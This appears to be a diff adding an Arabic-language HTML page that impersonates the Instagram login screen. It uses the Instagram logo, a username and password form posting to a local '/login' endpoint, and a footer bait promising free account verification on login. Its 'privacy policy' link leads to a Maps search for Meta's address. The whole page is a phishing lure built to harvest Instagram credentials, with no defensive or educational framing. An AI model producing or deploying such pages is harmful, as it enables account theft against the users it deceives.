@@ -1,0 +1,111 @@
+<!doctype html>
+<html lang="fr">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل دخول Instagram</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            background-size: cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            background-color: rgba(255, 255, 255, 0.4); /* جعل الحاوية شفافة بنسبة 20% */
+            border-radius: 20px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            width: 80%;
+            max-width: 400px;
+            text-align: center;
+            backdrop-filter: blur(15px); /* تأثير تعتيم الخلفية */
+        }
+
+        .logo {
+            margin-bottom: 10px;
+        }
+
+        .logo img {
+            width: 40px;
+        }
+
+        h1 {
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-size: 20px;
+            color: #555;
+            margin-bottom: 8px;
+            text-align: right;
+        }
+
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #ccc;
+            border-radius: 25px;
+            box-sizing: border-box;
+            font-size: 14px;
+        }
+
+        input[type="submit"] {
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 25px;
+            font-size: 18px;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        input[type="submit"]:hover {
+            background-color: #007bb5;
+        }
+
+        .footer {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #555;
+        }
+
+        .footer a {
+            color: #0095f6;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
+        </div>
+        <h1>تسجيل دخول Instagram</h1>
+        <form action="/login" method="post">
+            <label for="username">اسم المستخدم:</label>
+            <input type="text" id="username" name="username" required><br>
+            <label for="password">كلمة المرور:</label>
+            <input type="password" id="password" name="password" required><br>
+            <input type="submit" value="تسجيل الدخول">
+        </form>
+        <div class="footer">
+            <p>بمجرد الضغط على الدخول للحساب فإنك توافق على ثوثيق حسابك  مجانا بنسبة 30% ✔️<a href="https://www.google.com/maps/search/1601+Willow+Road,+Menlo+Park,+CA+94025?entry=gmail&source=g">سياسة الخصوصية</a></p>
+        </div>
+    </div>
+</body>
+</html>
